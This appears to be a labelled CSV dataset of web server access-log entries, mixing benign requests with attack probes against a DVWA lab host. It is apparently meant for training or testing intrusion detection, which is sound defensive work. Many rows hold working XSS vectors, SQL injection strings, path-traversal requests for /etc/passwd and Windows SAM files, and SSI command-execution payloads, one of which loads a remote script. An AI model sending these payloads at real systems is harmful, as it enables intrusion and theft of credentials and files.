Remote_host,Identd,REMOTE_USER,Date_time,Method,Path,Version,Status,Length,Label
172.17.0.1,-,-,12/Feb/2019:08:55:09 +0000,GET,/docs?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,HTTP/1.1,301,694,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:50 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/php.ini,HTTP/1.1,200,406,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,"/webcalendar/week.php?user=\\\""><script>alert(document.cookie)</script>",HTTP/1.1,404,511,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:26 +0000,GET,/dvwa/css?query=query+UNION+ALL+select+NULL+--+,HTTP/1.1,301,604,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/?user_token=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
40.77.167.66,-,-,13/Dec/2015:12:05:08 +0100,GET,/robots.txt,HTTP/1.1,200,304,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:28 +0000,GET,/forum1.asp?n=/../../../../../../etc/passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.,HTTP/1.1,404,501,3.0
172.17.0.1,-,-,12/Feb/2019:08:08:26 +0000,GET,/atomicboard/index.php?location=../../../../../../../../../../etc/passwd,HTTP/1.1,404,512,3.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>",HTTP/1.1,404,512,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:26 +0000,GET,/../../../../winnt/repair/sam._,HTTP/1.1,400,485,3.0
213.24.125.23,-,-,13/Dec/2015:12:46:06 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:41 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images?query=query+UNION+ALL+select+NULL+--+,HTTP/1.1,301,610,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:20 +0000,GET,/instructions.php?doc=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E,HTTP/1.1,200,14305,1.0
www-c3.proxy.aol.com,-,-,01/Aug/1995:00:07:05 -0400,GET,/images/,HTTP/1.0,200,17688,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/sitemap.xml?query=query%27+UNION+ALL+select+NULL+--+,HTTP/1.1,404,447,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/examplesWebApp/InteractiveQuery.jsp?person=<script>alert('Vulnerable')</script>,HTTP/1.1,404,526,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:48 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:29 +0000,GET,/instructions.php?query=query%27+AND+%271%27%3D%271%27+--+,HTTP/1.1,200,14305,2.0
92.244.224.113,-,-,12/Dec/2015:20:41:06 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:29 +0000,GET,/instructions.php?query=query%22+UNION+ALL+select+NULL+--+,HTTP/1.1,200,14305,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:50 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/robots.txt?query=query+AND+1%3D2+--+,HTTP/1.1,200,254,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/?username=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:48 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:11 +0000,GET,/dvwa/images/login_logo.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,HTTP/1.1,200,9319,3.0
177.203.52.133,-,-,13/Dec/2015:04:43:03 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:45 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:28 +0000,GET,/forum1.asp?n=....//....//....//....//....//....//....//etc.passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.,HTTP/1.1,404,501,3.0
37.78.90.110,-,-,13/Dec/2015:07:34:18 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:10 +0000,GET,/dvwa/images?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,HTTP/1.1,301,748,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/sysuser/docmgr/vccheckin.stm?name=<script>alert(document.cookie)</script>,HTTP/1.1,404,519,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit,HTTP/1.1,404,497,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:46 +0000,GET,/dvwa/css/login.css?query=CduEfTMBwxqayZjRMseMrYnJIGGXXpShCNhXKbcLnoymHhtVfHQCaWpnFKgYQFMjEPxdciLrkRZqnPDVNtADIMjDttFtSPdnblkGhEkUsEWsGUqvLbOxNLRhAeMYtvBjNTueqelSjeLHSGlYdbpTGwmiryQHkgMJJyITbRqmgfggxXOgiyLURxvhKrFHoQbEJdOXkKbKuUEWbyCBYYRehTamWRkrlCYdBdCkPVhYxdfWLmLmbrNORnvoJSuvNMGvxlfgApXZYXjyuAUJPCulxBqsJSiGEpqRttFBKesqwLqxvpTepJutRHKEcUvELrqWuDilVLOaORfjoQmmQCgTySuTVtHZaugCeHBfOqZJmCuECaYBlmmYsYiZFCWqvFcjTPhUKCuInDxEvtvDiUvXeZCPcCAaFnUYtvkhFRjPyxHRrUKupSWLTKsUXEiLySjjWVwVLxWRcPsQPPLoqihWChWhSkxiydLaVvGMqCvCkCoxyJyWYagZaDFiEsUkEowxlDRuFRyeZkNsMTJbeERPsvkOjfXQCPssuGxHJDHKaRlSgcGSMgYYsHrOrNClKDwTvmeDCXanaHZFDuWPJPVvaKpdHLbhcuDulWpDKwcUHCnFtFwFUAmVFVIdZcsTLCrOgYhTVGbSIqWsFfYGTIoIakEethmaqppnCIFhmiPEZqNZUEnCRNQJFOeJDtYvRnLhPbUtiucUxqRRuKRvehFslyafMskNklJPqlCKTPkytwZNcJbTonDDfGejLIXkXAsmUQfsCcaVaTJaLpqlYGPRricuWIysNJQppDdsCHqGlDvHpICmIwLspwDxgNUNBFtFQLXoiDfdnfrOTyhxWaWpSBKhByIKQOFqmVUNFtGaMkwidqnViYQuHTyhpjLwNVvsAmThgGMjsyKSKQcRiGqveRBhMeXHXGyBxNTYTQBhdmfPMMjPkMYDgMnlbYDtgOrBMCiXJHtvyuYtyLnqSQRNVGMMoSScmvsnHKrVtsLygogbdmcvHKGrBXxvuMgALrmtwANALOsFZVGahtweRFBDeErZECjwusgnAJpgxJqUbipmRFUEvsvSrvAFsTTlmKpkyphfWQvGsMRMvGNBMHtqqYAeOkMykyhPhwALjoJdFqvZyMieSZldCbxgPMkLqSimodlaTUkIPiKainiQIBJUEcYZwCCUQkRbxIprAUWFbqvQkXnwYErNstnSVeBAMYHwhfHkTHacfOYynPRVKHrxrIQBLkpbVQjMZHosnqcEkDxONZxUwRkEdWrVAYQUBIJhEHKXMRXiKtZwchZDHSWJAaXLelJmKyBaRngjetJOpjWpFqXaqlASElouuOLvcKBhDVXWQbPevanUkTeHBWdoxHyBLvKZHtvjoFZaQkjmtyGUwwQVGrRalEaNmAFEgXqMXGxhnORjvogOrNFpywhDOSimPXpGcJPvtHjvXfBmtRmKBtWCQpdHjbKSDccjHpqKHnqYSqhOwpYDEIVcauwvkiIMXTRRADyKpJPZPxqAkaRuKqsDTcAVhEyZhoeNVxjqkSuCYLpMjjHqKrEmhjtQBxhtOtVDdkSxMBPgnfcipGOpWkSBDagJvsrbhxhAdgpiBeIiAGfyVnSVdPvhdUUAmapRmcjZpetkyJAKUWGvBnCZMbawRirIJkBmiNmKXXrJvqrZDaZZXHhqTcgycjbBDBfCXRYEbunvttMckvLwcdPBPTmEwDSeiXUilFOOjuiMTIIDwqwCOsfLkaOejbsNlowhpYyEQVtLvZGaETUaEaUuVnmTmBhuFytgvcsfqSwKhWrbtLcpASiLQvyAbTODAealLatFCOAvDCOSBQMAKcDrghvohwHAITRrsDlQpVthmEarIaCNrTDiOrQilDuhqDmTugPsORuiciRlepHSFoiXOTmZjxfoNYmtBtMOaHgWMddglcuvyALQRfajRCZCkEPCVpPfKEhhSYxNxGNjXAwoGbyxQoquRpUvuMMuBcgoSGFqxcxJgSXdLAdYjJcLkEByaYqTxLwmGwvCcKusNZXdfBmVnmxXiKaiJDEcEuZdDYabPhEFfOyhQZQbKHflIYuwcjgiaZIvGgwJFqLqPEjOfrpBHYuM,HTTP/1.1,200,1093,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>,HTTP/1.1,404,502,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:26 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:40 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/syshelp/cscript/showfncs.stm?pkg=<script>alert(document.cookie)</script>,HTTP/1.1,404,519,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/logo.png?query=query%29+UNION+ALL+select+NULL+--+,HTTP/1.1,200,5275,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:41 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:32 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:56 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:31 +0000,GET,/?username=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:34 +0000,GET,/docs/DVWA_v1.3.pdf,HTTP/1.1,200,422251,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/sysuser/docmgr/info.stm?name=<script>alert(document.cookie)</script>,HTTP/1.1,404,514,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/?username=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>,HTTP/1.1,404,502,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:28 +0000,GET,/modif_infos.asp?n=../../../../../../../../../etc/passwd%00,HTTP/1.1,404,506,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:56 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam._,HTTP/1.1,404,537,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:55 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,POST,"/servlet/custMsg?guestName=<script>alert(\\\""Vulnerable\\\"")</script>",HTTP/1.1,404,506,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/instructions.php?doc=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,HTTP/1.1,200,14305,2.0
185.3.32.17,-,-,13/Dec/2015:12:35:09 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:52 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
62.192.246.119,-,-,12/Dec/2015:22:27:03 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:41 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:30 +0000,POST,/login.php?query=query+AND+1%3D2+--+,HTTP/1.1,302,281,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:25 +0000,GET,/docs?query=query%22+UNION+ALL+select+NULL+--+,HTTP/1.1,301,602,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/?username=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:36 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,POST,/login.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,HTTP/1.1,302,281,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/shoutbox.php?conf=../../../../../../../etc/passwd,HTTP/1.1,404,503,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:35 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:29 +0000,GET,/favicon.ico?query=query%22+UNION+ALL+select+NULL+--+,HTTP/1.1,200,1651,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:11 +0000,GET,/dvwa/images/spanner.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,HTTP/1.1,200,693,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:51 +0000,GET,/?password=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>,HTTP/1.1,404,501,1.0
177.193.76.80,-,-,13/Dec/2015:06:19:39 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
www-d3.proxy.aol.com,-,-,01/Aug/1995:00:02:54 -0400,GET,/shuttle/countdown/,HTTP/1.0,200,4324,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:04 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
5.138.36.198,-,-,13/Dec/2015:13:33:03 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:37 +0000,GET,/?user_token=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/setup.php,HTTP/1.1,200,4347,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:54 +0000,GET,/login.php?query=,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:40 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\\\""><script>alert('Vulnerable')</script>",HTTP/1.1,404,511,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:50 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:31 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:56 +0000,GET,/?password=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E,HTTP/1.1,302,300,1.0
95.140.24.131,-,-,13/Dec/2015:13:30:35 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/favicon.ico?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,HTTP/1.1,200,1651,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/login.php,HTTP/1.1,200,1864,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:47 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:25 +0000,GET,/?query=query%29+UNION+ALL+select+NULL+--+,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:41 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:30 +0000,GET,/login.php?query=query%27+AND+%271%27%3D%271%27+--+,HTTP/1.1,200,1795,2.0
178.204.13.65,-,-,13/Dec/2015:09:31:07 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
acs4.acs.ucalgary.ca,-,-,01/Jul/1995:00:18:02 -0400,GET,/shuttle/countdown/,HTTP/1.0,200,3985,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:15 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:49 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:37 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:36 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:47 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
31.180.50.222,-,-,13/Dec/2015:10:59:28 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,POST,/setup.php?query=query+OR+1%3D1+--+,HTTP/1.1,302,281,2.0
5.138.178.69,-,-,13/Dec/2015:00:39:39 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:11 +0000,GET,/dvwa/images/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,HTTP/1.1,200,2341,3.0
204.212.254.71,-,-,01/Jul/1995:00:15:58 -0400,GET,/shuttle/countdown/,HTTP/1.0,200,3985,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:50 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
link097.txdirect.net,-,-,01/Jul/1995:00:05:23 -0400,GET,/icons/menu.xbm,HTTP/1.0,200,527,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/favicon.ico?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,HTTP/1.1,200,1651,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:47 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
corp-uu.infoseek.com,-,-,01/Jul/1995:00:10:22 -0400,GET,/ksc.html,HTTP/1.0,200,7074,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:35 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:47 +0000,GET,/?Login=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:54 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/docs?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,HTTP/1.1,301,612,2.0
ppp-mia-53.shadow.net,-,-,01/Jul/1995:00:06:46 -0400,GET,/ksc.html,HTTP/1.0,200,7074,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/setup.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,HTTP/1.1,200,4347,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:17 +0000,GET,/dvwa/images/RandomStorm.png?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,HTTP/1.1,200,4746,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/~/<script>alert('Vulnerable')</script>.aspx,HTTP/1.1,404,546,3.0
172.17.0.1,-,-,12/Feb/2019:08:08:28 +0000,GET,/forum1_professionnel.asp?n=/../../../../../../../../etc/passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.,HTTP/1.1,404,515,3.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/iissamples/exair/search/search.idq?CiTemplate=../../../../../../../../../../winnt/win.ini,HTTP/1.1,404,525,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
2.134.205.87,-,-,13/Dec/2015:10:14:39 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:54 +0000,GET,/dvwa/js/?query=,HTTP/1.1,200,1347,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:46 +0000,GET,/?Login=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:54 +0000,GET,/instructions.php,HTTP/1.1,200,14305,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:26 +0000,GET,////./../.../boot.ini,HTTP/1.1,400,485,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:31 +0000,GET,/?username=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/eventum/forgot_password.php?email=\\\""><script>alert(document.cookie)</script>",HTTP/1.1,404,518,1.0
